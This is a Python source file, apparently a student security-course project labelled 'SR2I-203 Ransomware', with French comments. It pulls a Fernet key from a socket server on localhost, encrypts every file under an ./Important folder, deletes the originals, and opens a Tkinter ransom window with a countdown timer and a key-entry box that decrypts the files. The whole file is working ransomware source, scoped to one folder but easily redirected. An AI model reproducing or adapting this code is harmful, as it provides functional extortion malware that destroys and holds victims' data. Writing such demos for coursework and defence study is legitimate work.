from cryptography.fernet import Fernet
import socket, os, pyfiglet
import tkinter as tk
import base64
import traceback

#Fonction de chiffrement
def encrypt_file(path):
    if not path.endswith(".encrypted"):
        print("Le chemin est %s" %path)
        path_without_ext = os.path.splitext(path)[0]
        new_path = path_without_ext + ".encrypted"
        #os.rename(path, new_path)
        with open(path, "rb") as normal_file:
            normal_content=normal_file.read()
            print("Le fichier contient:%s" %normal_content)
            with open(new_path, "wb") as encrypted_file:
                encrypted_content= fn.encrypt(normal_content)
                encrypted_file.write(encrypted_content)
                encrypted_file.close()
            normal_file.close()
        os.remove(path)


#Fonction de dechiffrement
def decrypt_file(path):
    if path.endswith(".encrypted"):
        path_without_ext = os.path.splitext(path)[0]
        text=os.path.splitext(path)
        #new_path=path_without_ext + os.path.split
        with open(path, "rb") as encrypted_file:
            # Stocker les données lues dans une variable
            encrypted_content = encrypted_file.read()
            print("Le contenu chiffre qui est lu est %s:"%encrypted_content)
            with open(path_without_ext, "wb") as normal_file:
                decrypted_content=fn.decrypt(encrypted_content)
                normal_file.write(decrypted_content)
                normal_file.close()
            encrypted_file.close()
        os.remove(path)




#Fonction qui verifie la cle
def check_key():
    key_e=entry.get()
    key_e=key_e.encode(encoding = 'UTF-8')
    #print("La clé qu'on entre est %s" %key_e)
    if key_e==key:
        print("Meme clé")
    else:
        print("Pas la même clé")
    try:
        for path, dirs, files in os.walk(relative_path):
            for f in files:
                decrypt_file(os.path.join(path, f))
        label1['text'] = "Dechiffrement realise avec succes"
    except Exception as e:
        label1['text'] = "Cle invalide, veuillez reessayer"
        traceback.print_exc()




#Creation de la socket et connexion, on envoie "key" quand on reçoit la clé
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 4321))
s.send(b'key')
key = s.recv(2048)
s.close()

#creation d'un objet fernet nous permettant de chiffrer ou dechiffrer
fn= Fernet(key)

#On encrypte chaque fichier
relative_path="./Important"
for path, dirs, files in os.walk(relative_path):
    for f in files: 
        encrypt_file(os.path.join(path, f))


# Use pyfiglet pour faire une banniere
banner= pyfiglet.figlet_format("Vous avez ete victime de SR2I - 203")
print(banner)


def countdown(count):
    # change text in label
    # count = '01:30:00'
    hour, minute, second = count.split(':')
    hour = int(hour)
    minute = int(minute)
    second = int(second)

    label['text'] = '{}:{}:{}'.format(hour, minute, second)

    if second > 0 or minute > 0 or hour > 0:
        # call countdown again after 1000ms (1s)
        if second > 0:
            second -= 1
        elif minute > 0:
            minute -= 1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
        root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second)) 
    else:
        label['text'] = "Time's up!"
        label.config(fg='red')

root = tk.Tk()
root.title('SR2I-203 Ransomware')
root.geometry('500x300')
root.resizable(False, False)

label1 = tk.Label(root, text='Vos donnees sont prises en otage mais ne me payez pas, donnez moi juste une bonne note"\n\n', font=('calibri', 12,'bold'))
label1.pack()

label = tk.Label(root,font=('calibri', 50,'bold'), fg='white', bg='blue')
label.pack()

entry = tk.Entry(root, font=('calibri', 20))
entry.pack()



        


submit_button = tk.Button(root, text="Submit", command=check_key)
submit_button.pack()

# call countdown first time    
countdown('01:30:00')
root.mainloop()
